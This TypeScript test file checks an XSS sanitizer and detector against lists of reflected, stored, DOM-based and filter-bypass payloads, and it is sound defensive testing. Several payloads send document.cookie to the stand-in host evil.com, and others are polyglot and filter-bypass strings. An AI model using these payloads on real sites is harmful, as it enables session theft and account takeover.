/**
 * OWASP A03:2021 - Cross-Site Scripting (XSS) Testing
 * Reflected XSS, Stored XSS, DOM-based XSS
 * 
 * @security-test
 * @owasp A03:2021
 * @severity HIGH
 */

import * as fc from 'fast-check';

// XSS Sanitization
const sanitizeHTML = (input: string): string => {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

const stripTags = (input: string): string => {
  return input.replace(/<[^>]*>/g, '');
};

const isXSSPayload = (input: string): boolean => {
  const xssPatterns = [
    /<script\b[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /expression\s*\(/i,
    /vbscript:/i,
    /data:text\/html/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<svg.*onload/i,
    /<img.*onerror/i,
    /document\.(cookie|location|write)/i,
    /window\.(location|open)/i,
    /eval\s*\(/i,
    /setTimeout\s*\(/i,
    /setInterval\s*\(/i,
    /innerHTML/i,
    /outerHTML/i,
    /alert\s*\(/i,  // Direct alert calls
    /atob\s*\(/i,   // Base64 decode (often used in XSS)
    /<\w+[^>]*\s+on\w+/i  // Any tag with event handler
  ];
  
  return xssPatterns.some(pattern => pattern.test(input));
};

describe('OWASP A03:2021 - XSS Tests', () => {
  describe('Reflected XSS Prevention', () => {
    const reflectedXSSPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      "'-alert('XSS')-'",
      '<img src="x" onerror="alert(\'XSS\')">',
      '<div onmouseover="alert(\'XSS\')">hover me</div>',
      '<a href="javascript:alert(\'XSS\')">click</a>',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>'
    ];

    it('should detect reflected XSS payloads', () => {
      reflectedXSSPayloads.forEach(payload => {
        expect(isXSSPayload(payload)).toBe(true);
      });
    });

    it('should sanitize XSS payloads by encoding', () => {
      reflectedXSSPayloads.forEach(payload => {
        const sanitized = sanitizeHTML(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
      });
    });

    it('should strip all HTML tags', () => {
      reflectedXSSPayloads.forEach(payload => {
        const stripped = stripTags(payload);
        expect(stripped).not.toMatch(/<[^>]*>/);
      });
    });
  });

  describe('Stored XSS Prevention', () => {
    const storedXSSPayloads = [
      '<script>document.location="http://evil.com/?c="+document.cookie</script>',
      '<img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
      '<svg/onload=fetch("//evil.com/"+document.cookie)>',
      '"><img src=x onerror=this.src="http://evil.com/?c="+document.cookie>',
      '<script>new Image().src="http://evil.com/steal.php?cookie="+document.cookie;</script>'
    ];

    it('should detect cookie stealing attempts', () => {
      storedXSSPayloads.forEach(payload => {
        expect(isXSSPayload(payload)).toBe(true);
        expect(payload.toLowerCase()).toMatch(/document\.cookie|fetch|\.src/);
      });
    });

    it('should sanitize stored XSS payloads', () => {
      storedXSSPayloads.forEach(payload => {
        const sanitized = sanitizeHTML(payload);
        // After sanitization, script tags should be encoded
        expect(sanitized).not.toMatch(/<script>/i);
      });
    });
  });

  describe('DOM-based XSS Prevention', () => {
    const domXSSPayloads = [
      'javascript:alert(document.domain)',
      'data:text/html,<script>alert("XSS")</script>',
      'javascript:eval(atob("YWxlcnQoJ1hTUycp"))',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
    ];

    it('should detect DOM XSS payloads', () => {
      domXSSPayloads.forEach(payload => {
        const isDangerous = /javascript:|data:text\/html|eval\(|atob\(/i.test(payload);
        expect(isDangerous).toBe(true);
      });
    });
  });

  describe('XSS Filter Bypass Attempts', () => {
    const bypassPayloads = [
      '<ScRiPt>alert("XSS")</ScRiPt>',  // Case variation
      '<scr<script>ipt>alert("XSS")</scr</script>ipt>',  // Nested tags
      '<script>alert(String.fromCharCode(88,83,83))</script>',  // Char codes
      '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',  // Hex encoding
      '<script>alert`XSS`</script>',  // Template literals
      '<script>alert(/XSS/.source)</script>',  // Regex source
      '<<script>script>alert("XSS")<</script>/script>',  // Double encoding
      '<img src=`x`onerror=alert("XSS")>',  // Backticks
      '<img src=x onerror=alert&lpar;"XSS"&rpar;>',  // HTML entities
      '<svg><script>alert&#40;"XSS"&#41;</script></svg>'  // SVG context
    ];

    it('should detect bypass attempts', () => {
      bypassPayloads.forEach(payload => {
        const normalized = payload.toLowerCase();
        const hasDangerousContent = 
          normalized.includes('script') ||
          normalized.includes('onerror') ||
          normalized.includes('alert');
        expect(hasDangerousContent).toBe(true);
      });
    });
  });

  describe('Property-Based XSS Testing', () => {
    it('should sanitize any input containing angle brackets', () => {
      fc.assert(
        fc.property(
          fc.string(),
          fc.constantFrom('<script>', '<img', '<svg', '<iframe'),
          fc.string(),
          (prefix, tag, suffix) => {
            const payload = prefix + tag + suffix;
            const sanitized = sanitizeHTML(payload);
            expect(sanitized).not.toContain('<');
            expect(sanitized).not.toContain('>');
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle event handler injection attempts', () => {
      fc.assert(
        fc.property(
          fc.constantFrom('onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'),
          fc.constantFrom('=', ' =', '= '),
          fc.constantFrom('alert(1)', 'eval(x)', 'fetch(url)'),
          (event, equals, code) => {
            const payload = `<div ${event}${equals}"${code}">`;
            expect(isXSSPayload(payload)).toBe(true);
          }
        ),
        { numRuns: 100 }
      );
    });
  });
});
